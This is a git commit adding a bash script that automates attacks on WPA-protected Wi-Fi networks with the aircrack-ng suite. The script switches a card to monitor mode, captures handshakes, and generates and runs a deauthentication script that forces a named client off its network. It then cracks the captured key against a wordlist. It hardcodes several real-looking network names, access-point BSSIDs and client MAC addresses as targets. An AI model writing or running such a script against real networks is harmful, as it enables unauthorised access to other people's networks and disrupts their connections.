3c6f5f486cfdce5a29540ae690908b6ce9fab565
Rowan Pang <pangweizhen.2008@hotmail.com>
2017-06-23 16:06:52 +0800

    1,add wpaxpsk script

---
+++ net/wireless/crack/check/crack.sh
@@ -0,0 +1,75 @@
+#!/bin/bash
+
+function reset(){
+    airmon-ng stop $ifmon
+    nmcli radio wifi off
+    sleep 0.5
+    nmcli radio wifi on
+}
+
+function toMonitor(){
+    airmon-ng start $ifname
+    #iwconfig $ifmon freq $channel
+    iwconfig $ifmon freq $wkfreq
+}
+
+function injectTest(){
+    aireplay-ng -9 -e $SSID -a $BSSID $ifmon
+}
+
+function dump(){
+    airodump-ng -c $channel --bssid $BSSID -w $capPrefix $ifmon
+}
+
+function crack(){
+    local pwdfile="pwd.txt"
+    aircrack-ng -w ./pwd.lst -b $BSSID $capPrefix*.cap
+    #aircrack-ng -w ./pwd.lst -b $BSSID $capPrefix*.cap | grep "KEY FOUND!" | tee $pwdfile
+}
+
+function genDeAuthenScript(){
+    local scriptName="${SSID}-deAuthen-$cli.sh"
+    if [ ! -s $scriptName ];then
+	cat > $scriptName <<EOF
+#!/bin/bash
+
+#autoGen do not edit it
+
+aireplay-ng -0 1 -a $BSSID -c $cli $ifmon
+EOF
+	chmod a+x $scriptName
+    fi
+}
+
+function main(){
+    genDeAuthenScript
+    reset
+    toMonitor
+    injectTest
+    dump
+    crack
+    reset
+}
+
+#BSSID="6C:B0:CE:17:AD:71"
+#SSID="phome-wndr"
+#channel="3"
+#cli="50:68:0A:D5:02:B4"
+
+BSSID="14:CF:92:BC:A9:4D"
+SSID="InspurHot"
+channel="10"
+cli="9C:AD:97:D1:4F:31"
+
+#BSSID="70:F9:6D:34:FB:91"
+#SSID="Inspur"
+#channel="11"
+#cli="E8:2A:EA:AE:7D:47"
+
+let chnum=${channel}-1
+let wkfreq=2412000000+5000000*$chnum
+capPrefix="$SSID-$BSSID"
+ifname="wlp2s0"
+ifmon="${ifname}mon"
+
+main
